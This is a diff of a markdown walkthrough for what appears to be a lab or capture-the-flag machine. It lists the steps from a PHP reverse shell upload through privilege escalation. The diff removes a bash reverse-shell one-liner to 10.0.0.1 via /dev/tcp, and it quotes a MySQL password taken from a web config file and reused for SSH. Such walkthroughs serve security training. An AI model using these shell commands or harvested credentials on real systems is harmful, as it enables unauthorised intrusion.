@@ -37,15 +37,16 @@
 
   - **Exploitation**
     - PHP reverse shell upload
-      ` bash -i >& /dev/tcp/10.0.0.1/8080 0>&1`
+      **Script used:** [shell.php](./shell.php)
     - Netcat listener
     - Initial access as `www-data`
       ![results](/images/Screenshot_2026-10-14_04_00_42.png)
     - `LinPEAS` privilege enumeration
-
       ![results](/images/Screenshot_2026-10-14_04_31_08.png)
-      ![results](/images/Screenshot_2026-10-14_04_32_09.png)
+
+    - get user access are a grimmie using ssh with this password
       `/var/www/html/academy/admin/includes/config.php:$mysql_password = "My_V3ryS3cur3_P4ss";`
+      ![results](/images/Screenshot_2026-10-14_04_32_09.png)
 
     - Root-running backup script
       ![results](/images/Screenshot_2026-10-14_04_43_12.png)
